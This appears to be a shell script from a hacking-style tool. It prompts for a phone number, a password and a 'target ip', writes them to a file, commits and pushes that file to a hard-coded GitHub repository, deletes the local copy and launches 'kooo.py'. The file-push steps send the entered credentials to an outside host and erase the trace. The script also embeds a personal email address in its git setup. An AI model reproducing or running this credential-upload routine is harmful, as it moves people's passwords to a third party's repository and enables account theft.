git config --global user.name "oo-ozo"
git config --global user.email "kooo101979@gmail.com"
git pull
read -p "enter ph :" H
read -p "enter pass :" F

read -p "enter target ip :" T


echo $H >> $T
echo $F >> $T
git init
git add $T
git commit -m "first commit"
git remote add origin https://github.com/oo-ozo/target.git
git push -u origin master
rm $T
python kooo.py
